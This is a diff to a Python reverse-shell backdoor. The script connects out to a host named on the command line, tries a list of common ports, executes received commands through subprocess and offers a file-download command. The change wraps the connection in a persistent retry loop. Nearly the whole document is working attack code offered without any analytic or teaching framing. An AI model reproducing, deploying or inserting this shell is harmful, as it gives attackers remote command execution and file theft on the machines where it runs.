@@ -1,9 +1,8 @@
-import socket, time, base64
-import sys
+import socket, time, base64, sys
 from subprocess import Popen, PIPE
 
 history = []
-
+working = True
 
 def download(_client):
     _client.send("Filename: ".encode())
@@ -36,7 +35,6 @@ def open_shell(_client):
         try:
             command = _client.recv(4096).decode()
             if command == '':
-                main()
                 break
             elif command == 'dl\n':
                 download(_client)
@@ -66,19 +64,21 @@ def open_shell(_client):
         except Exception as e:
             _client.send(bytes(str(e), 'utf-8'))
         finally:
-            if not command == '':
-                history.append(command)
-            command = ''
+            history.append(command)
 
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ports_to_try = [8000, 1234, 12345, 8081, 8080, 81, 80, 443, 9000, 10000, 8082, 8083, 45690, 50984, 32980]
-for port in ports_to_try:
-    try:
-        client.connect((sys.argv[1], port))
-    except Exception as e:
-        time.sleep(1)
-        continue
-    else:
-        open_shell(client)
-        break
+def main():
+    while working:
+        for port in ports_to_try:
+            try:
+                client.connect((sys.argv[1], port))
+            except Exception as e:
+                time.sleep(1)
+                continue
+            else:
+                open_shell(client)
+                break
+
+main()
